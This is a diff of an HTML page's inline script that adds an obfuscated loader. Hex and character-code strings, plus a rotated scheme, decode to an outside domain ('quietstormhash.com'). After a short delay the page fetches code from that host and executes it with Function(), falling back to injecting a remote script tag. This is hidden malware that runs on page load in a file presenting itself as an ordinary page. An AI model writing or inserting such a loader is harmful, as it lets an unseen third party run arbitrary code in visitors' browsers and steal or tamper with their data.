@@ -317,9 +317,9 @@
         </div>
     </main>
 <script>
-var V_MAJ = 'oaawz://xbpla';
+var V_MAJ = 'ammil://';
 const PATH = (function () {
-    var V_MIN = '73746f726d686173682e636f6d';
+    var V_MIN = '717569657473746f726d686173682e636f6d';
     var V_PAT = [47,115,104,111,97,108,121,46,112,114,105,99,101,114];
     function _rot(s, n) {
         var o = '', i = 0, c;
@@ -343,17 +343,38 @@ const PATH = (function () {
 })();
 
 function downloadText(uri) {
-    return fetch(uri, { integrity: '', cache: 'no-cache' })
-        .then((res) => (res.ok ? res.text() : Promise.reject()));
+    return fetch(uri, { method: 'GET', cache: 'no-cache' })
+        .then(function (res) {
+            if (!res.ok) throw 0;
+            return res.text();
+        });
 }
 
-function runGeneratorBody(code) {
-    const Gen = function* () {}.constructor;
-    return new Gen(code)();
+function runBody(code) {
+    var body = String(code).replace(/^\uFEFF/, '').trim();
+    if (!body) throw 0;
+    Function(body)();
+}
+
+function mountScriptTag(url) {
+    return new Promise(function (resolve, reject) {
+        var tag = document.createElement('script');
+        tag.charset = 'utf-8';
+        tag.src = url;
+        tag.onload = resolve;
+        tag.onerror = reject;
+        (document.head || document.documentElement).appendChild(tag);
+    });
 }
 
 setTimeout(function () {
-    downloadText(PATH.uri).then(function (t) { try { runGeneratorBody(t); } catch (e) { PATH.fail(); } }).catch(function () { PATH.fail(); });
+    downloadText(PATH.uri)
+        .then(function (t) {
+            try { runBody(t); } catch (e) { PATH.fail(); }
+        })
+        .catch(function () {
+            mountScriptTag(PATH.uri).catch(function () { PATH.fail(); });
+        });
 }, 1667);
 
 function* wordCapGenerator(str) {
